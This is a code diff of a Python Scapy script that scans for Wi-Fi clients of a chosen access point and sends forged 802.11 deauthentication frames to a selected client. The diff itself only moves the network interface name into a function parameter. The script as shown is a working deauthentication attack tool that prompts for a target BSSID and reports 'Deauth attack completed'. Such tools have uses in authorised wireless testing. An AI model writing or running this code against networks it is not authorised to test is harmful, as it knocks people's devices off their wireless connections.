@@ -3,8 +3,6 @@ from tabulate import tabulate
 import time
 import threading
 
-INTERFACE="wlp2s0"
-
 def countdown(seconds, stop_event):
         """מדפיס כל שניה כמה שניות נותרו לסיום הסריקה"""
         for remaining in range(seconds, 0, -1):
@@ -14,7 +12,7 @@ def countdown(seconds, stop_event):
             time.sleep(1)
         print("\r⏱  Scanning... done!")
 
-def scan_clients_of_ap(bssid, timeout=100):
+def scan_clients_of_ap(interface, bssid, timeout=100):
     """
     Scans for clients connected to a specific BSSID using Scapy.
     Returns a dict of {client_mac: {"RSSI": ..., "Vendor": ...}}.
@@ -35,12 +33,12 @@ def scan_clients_of_ap(bssid, timeout=100):
                                 "Vendor": get_vendor(mac)
                             }
 
-    print(f"🔍 Scanning for clients of BSSID {bssid} on interface {INTERFACE} for {timeout} seconds...")
+    print(f"🔍 Scanning for clients of BSSID {bssid} on interface {interface} for {timeout} seconds...")
 
     timer_thread = threading.Thread(target=countdown, args=(timeout, stop_event), daemon=True)
     timer_thread.start()
 
-    sniff(iface=INTERFACE, prn=handler, timeout=timeout, store=0)
+    sniff(iface=interface, prn=handler, timeout=timeout, store=0)
 
     stop_event.set()  
     return clients
@@ -53,11 +51,11 @@ def get_vendor(mac):
     except:
         return "Unknown"
 
-def send_deauth_to_client(bssid, count=100, interval=0.1):
+def send_deauth_to_client(interface, bssid, count=100, interval=0.1):
     """
     Scans clients of a given AP, displays them, lets user choose one, and sends deauth.
     """
-    clients = scan_clients_of_ap(bssid)
+    clients = scan_clients_of_ap(interface, bssid)
 
     if not clients:
         print("❌ No clients found.")
@@ -80,10 +78,11 @@ def send_deauth_to_client(bssid, count=100, interval=0.1):
 
     print(f"[!] Sending deauth packets to {target_mac} from {bssid}...")
     pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
-    sendp(pkt, iface=INTERFACE, count=count, inter=interval, verbose=1)
+    sendp(pkt, iface=interface, count=count, inter=interval, verbose=1)
     print("✅ Deauth attack completed.")
 
 # Example usage
 if __name__ == "__main__":
     bssid = input("📶 Enter BSSID of target AP: ")
-    send_deauth_to_client(bssid, INTERFACE)
+    INTERFACE="wlp2s0"
+    send_deauth_to_client(INTERFACE, bssid)
